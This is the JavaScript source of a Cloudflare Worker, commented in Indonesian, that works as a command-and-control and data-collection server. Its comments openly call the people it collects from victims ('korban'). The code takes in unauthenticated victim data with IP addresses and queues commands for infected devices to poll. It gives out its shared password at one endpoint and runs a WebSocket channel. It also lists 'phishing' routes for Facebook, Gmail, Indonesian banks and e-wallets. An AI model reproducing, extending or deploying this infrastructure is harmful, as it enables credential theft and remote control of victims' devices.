// ================================================================
// CLOUDFLARE WORKER - verifikasi-api
// SINKRON 100% DENGAN 3 FILE ACUAN
// ================================================================

// ============================================================
// KONFIGURASI
// ============================================================
const MAX_DATA = 5000;
const WS_PING_INTERVAL = 30000; // 30 detik

// ============================================================
// CORS HEADERS
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-API-Key, X-Password',
  'Access-Control-Max-Age': '86400',
};

// ============================================================
// RESPONSE HELPERS
// ============================================================
function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS,
    },
  });
}

function htmlResponse(html, status = 200) {
  return new Response(html, {
    status,
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      ...CORS,
    },
  });
}

// ============================================================
// 🔥 AUTHENTICATION - HANYA 1 PASSWORD!
// ============================================================
function isAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              url.searchParams.get('password') ||
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.PASSWORD;
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    
    // ✅ CORS OPTIONS
    if (method === 'OPTIONS') {
      return new Response(null, { headers: CORS });
    }

    // ============================================================
    // 🔥 GET /get-password - KORBAN AMBIL PASSWORD
    // ============================================================
    if (url.pathname === '/get-password' && method === 'GET') {
      const password = env.PASSWORD || '';
      return jsonResponse({
        status: 'ok',
        password: password,
        timestamp: Date.now()
      });
    }

    // ============================================================
    // 🔥 POST /data - KORBAN KIRIM DATA (TANPA PASSWORD!)
    // ============================================================
    if (url.pathname === '/data' && method === 'POST') {
      return await handlePostData(request, env);
    }

    // ============================================================
    // 🔥 GET /data - DASHBOARD AMBIL DATA / KORBAN CEK PERINTAH
    // ============================================================
    if (url.pathname === '/data' && method === 'GET') {
      return await handleGetData(request, env);
    }

    // ============================================================
    // 🔥 POST /c2 - DASHBOARD KIRIM PERINTAH
    // ============================================================
    if (url.pathname === '/c2' && method === 'POST') {
      return await handleC2(request, env);
    }

    // ============================================================
    // 🔥 WEBSOCKET /ws
    // ============================================================
    if (url.pathname === '/ws') {
      return handleWebSocket(request, env);
    }

    // ============================================================
    // 🔥 HEALTH CHECK /
    // ============================================================
    if (url.pathname === '/' && method === 'GET') {
      const raw = await env.DATA.get('data') || '[]';
      const data = JSON.parse(raw);
      return jsonResponse({
        status: 'ok',
        version: '2.0.0',
        timestamp: new Date().toISOString(),
        totalData: data.length,
        endpoints: {
          get_password: '/get-password',
          post_data: 'POST /data',
          get_data: 'GET /data?key=xxx',
          get_command: 'GET /data?type=perintah&password=xxx',
          post_c2: 'POST /c2?key=xxx',
          websocket: 'wss://' + url.host + '/ws'
        }
      });
    }

    // ============================================================
    // 🔥 ROUTE /fb, /ig, /dana, dll (PHISHING)
    // ============================================================
    if (method === 'GET') {
      const phishingRoutes = {
        '/fb': 'https://www.facebook.com/login',
        '/ig': 'https://www.instagram.com/accounts/login',
        '/bri': 'https://ib.bri.co.id',
        '/dana': 'https://www.dana.id',
        '/gopay': 'https://www.gojek.com',
        '/ovo': 'https://www.ovo.id',
        '/mandiri': 'https://ib.bankmandiri.co.id',
        '/bca': 'https://m.klikbca.com',
        '/shopee': 'https://shopee.co.id/login',
        '/tokped': 'https://www.tokopedia.com',
        '/jenius': 'https://www.jenius.com',
        '/gmail': 'https://accounts.google.com/signin'
      };
      
      if (phishingRoutes[url.pathname]) {
        return Response.redirect(phishingRoutes[url.pathname], 302);
      }
    }

    // 404
    return jsonResponse({ error: 'Not Found' }, 404);
  }
};

// ============================================================
// 🔥 HANDLER: POST /data (KORBAN → SERVER - TANPA PASSWORD!)
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();

    if (!body || typeof body !== 'object') {
      return jsonResponse({ error: 'Invalid request body' }, 400);
    }

    // 🔥 DATA DARI KORBAN - TANPA PASSWORD!
    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };

    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);

    if (data.length >= MAX_DATA) {
      data = data.slice(-MAX_DATA + 1);
    }

    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));

    return jsonResponse({
      status: 'ok',
      total: data.length,
    });

  } catch (error) {
    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
  }
}

// ============================================================
// 🔥 HANDLER: GET /data (SERVER → KORBAN / DASHBOARD)
// ============================================================
async function handleGetData(request, env) {
  const url = new URL(request.url);
  const type = url.searchParams.get('type');
  const password = url.searchParams.get('password');
  const key = url.searchParams.get('key');

  // 🔥 AMBIL PERINTAH C2 (UNTUK KORBAN - PAKAI PASSWORD!)
  if (type === 'perintah') {
    const correctPassword = env.PASSWORD || '';

    if (password !== correctPassword) {
      return jsonResponse({
        status: 'error',
        message: 'Invalid password'
      }, 401);
    }

    try {
      const perintah = await env.DATA.get('perintah');
      if (perintah) {
        const cmd = JSON.parse(perintah);
        await env.DATA.delete('perintah');

        return jsonResponse({
          aksi: cmd.aksi || cmd.command || 'unknown',
          params: cmd.params || {},
          password: correctPassword,
          timestamp: Date.now()
        });
      }
      return jsonResponse({});
    } catch (e) {
      return jsonResponse({});
    }
  }

  // 🔥 AMBIL DATA UNTUK DASHBOARD (PAKAI PASSWORD!)
  if (!isAuthenticated(request, env)) {
    return jsonResponse({ error: 'Access Denied' }, 403);
  }

  try {
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);

    // Filter by source
    const source = url.searchParams.get('source');
    if (source) {
      data = data.filter(item => item.sumber === source);
    }

    // Search
    const search = url.searchParams.get('search');
    if (search) {
      const s = search.toLowerCase();
      data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
    }

    // Sort
    const sort = url.searchParams.get('sort') || 'newest';
    if (sort === 'newest') {
      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
    } else if (sort === 'oldest') {
      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
    }

    // Limit
    const limit = parseInt(url.searchParams.get('limit')) || 500;
    if (data.length > limit) {
      data = data.slice(0, limit);
    }

    return jsonResponse({
      status: 'ok',
      total: data.length,
      data: data
    });

  } catch (e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// 🔥 HANDLER: POST /c2 (DASHBOARD → SERVER - PAKAI PASSWORD!)
// ============================================================
async function handleC2(request, env) {
  if (!isAuthenticated(request, env)) {
    return jsonResponse({ error: 'Access Denied' }, 403);
  }

  try {
    const body = await request.json();
    const cmd = {
      aksi: body.command || body.aksi || 'unknown',
      params: body.params || {},
      timestamp: Date.now(),
      status: 'pending'
    };

    await env.DATA.put('perintah', JSON.stringify(cmd));

    return jsonResponse({
      status: 'ok',
      command: cmd.aksi,
      timestamp: cmd.timestamp
    });

  } catch (error) {
    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
  }
}

// ============================================================
// 🔥 HANDLER: WEBSOCKET /ws
// ============================================================
async function handleWebSocket(request, env) {
  const upgradeHeader = request.headers.get('Upgrade');
  if (!upgradeHeader || upgradeHeader !== 'websocket') {
    return new Response('Expected Upgrade: websocket', { status: 426 });
  }

  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);
  server.accept();

  let authenticated = false;
  let deviceId = 'unknown';
  let pingInterval = null;

  // 🔥 PING INTERVAL (KEEP-ALIVE)
  pingInterval = setInterval(() => {
    try {
      server.send(JSON.stringify({
        type: 'ping',
        timestamp: Date.now()
      }));
    } catch (e) {
      clearInterval(pingInterval);
    }
  }, WS_PING_INTERVAL);

  server.addEventListener('message', async (event) => {
    try {
      const data = JSON.parse(event.data);

      // ============================================================
      // 🔥 AUTHENTIKASI - HANYA 1 PASSWORD!
      // ============================================================
      if (data.type === 'auth') {
        const key = data.key || data.password || '';
        const correctPassword = env.PASSWORD || '';

        if (key === correctPassword) {
          authenticated = true;
          deviceId = data.deviceId || 'unknown';
          server.send(JSON.stringify({
            type: 'auth_success',
            role: data.role === 'admin' ? 'admin' : 'device',
            timestamp: Date.now()
          }));
        } else {
          server.send(JSON.stringify({ type: 'auth_failed' }));
          server.close(1008, 'Auth failed');
        }
        return;
      }

      // 🔥 JIKA BELUM AUTH, TOLAK
      if (!authenticated) {
        server.close(1008, 'Unauthorized');
        return;
      }

      // ============================================================
      // 🔥 PONG (RESPON PING)
      // ============================================================
      if (data.type === 'pong') {
        return;
      }

      // ============================================================
      // 🔥 COMMAND DARI DASHBOARD → Simpan perintah
      // ============================================================
      if (data.type === 'command') {
        const cmdData = data.command || {};
        cmdData.timestamp = Date.now();
        cmdData.status = 'pending';
        
        await env.DATA.put('perintah', JSON.stringify(cmdData));
        server.send(JSON.stringify({
          type: 'command_received',
          command: cmdData.aksi || 'unknown',
          timestamp: Date.now()
        }));
        return;
      }

      // ============================================================
      // 🔥 DATA DARI KORBAN (TANPA PASSWORD)
      // ============================================================
      if (data.type === 'data' || data.type === 'result') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);

        allData.push({
          waktu: new Date().toISOString(),
          sumber: data.type === 'result' ? 'c2_result' : 'websocket',
          data: data.data || data,
          deviceId: deviceId,
          ip: request.headers.get('CF-Connecting-IP') || 'unknown'
        });

        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }

        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'saved', timestamp: Date.now() }));
        return;
      }

      // ============================================================
      // 🔥 PING/PONG (KEEP-ALIVE)
      // ============================================================
      if (data.type === 'ping') {
        server.send(JSON.stringify({
          type: 'pong',
          timestamp: data.timestamp || Date.now()
        }));
        return;
      }

      // DEFAULT - ECHO
      server.send(JSON.stringify({ type: 'echo', data: data }));

    } catch (e) {
      server.send(JSON.stringify({ type: 'error', message: e.message }));
    }
  });

  server.addEventListener('close', () => {
    clearInterval(pingInterval);
  });

  return new Response(null, {
    status: 101,
    webSocket: client,
  });
}
